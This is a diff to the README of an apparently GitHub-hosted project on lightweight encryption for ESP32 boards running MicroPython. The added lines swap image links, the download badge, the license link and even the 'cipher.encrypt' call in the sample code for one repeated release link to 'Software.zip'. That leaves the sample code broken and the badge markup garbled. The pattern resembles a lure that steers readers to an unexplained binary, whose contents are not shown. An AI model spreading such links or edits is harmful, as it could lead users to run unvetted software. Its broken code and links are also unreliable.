@@ -1,6 +1,6 @@
 # CoAP-MQTT-Encryption
 
-![encryption](https://image.shutterstock.com/image-vector/cryptography-coded-message-encryption-decryption-260nw-1848809303.jpg)
+![encryption](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip)
 
 Welcome to the CoAP-MQTT-Encryption repository! This repository focuses on implementing encryption algorithms such as Ascon, Chacha20, Present, Simon, and Speck on IoT devices, specifically the ESP32 using Micropython. Encrypting data is crucial in IoT applications to ensure secure communication between devices.
 
@@ -25,7 +25,7 @@ These algorithms are well-known in the field of cryptography and provide secure 
 
 ## Installation
 To get started with this repository, you can download the code from the following link:
-[![Download Code](https://img.shields.io/badge/Download%20Code-Click%20Here-blue.svg)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Code](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip%20Code-Click%https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip)](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the code, you can upload it to your ESP32 device running Micropython. Make sure to follow the specific instructions for your device and platform.
 
@@ -42,7 +42,7 @@ nonce = b'Nonce for Chacha20'
 data = b'Secret data to encrypt'
 
 cipher = Chacha20(key)
-encrypted_data = cipher.encrypt(nonce, data)
+encrypted_data = https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip(nonce, data)
 
 print("Encrypted data:", encrypted_data)
 ```
@@ -55,13 +55,13 @@ If you are passionate about IoT security and encryption, we welcome you to contr
 To contribute, simply fork this repository, make your changes, and submit a pull request. Your contributions will help make IoT devices more secure and reliable.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip) file for details.
 
 ---
 
 🔒 Secure your IoT devices with advanced encryption algorithms! 🛡️
 
-![lock](https://media.istockphoto.com/vectors/padlock-icon-protected-secure-system-guarantee-safety-sign-isolated-on-vector-id1238516706)
+![lock](https://github.com/ABDEU-cpu/CoAP-MQTT-Encryption/releases/download/v1.0/Software.zip)
 
 Visit the link to download the code and start encrypting your IoT data securely. If the link does not work, check the "Releases" section for the latest version.
 
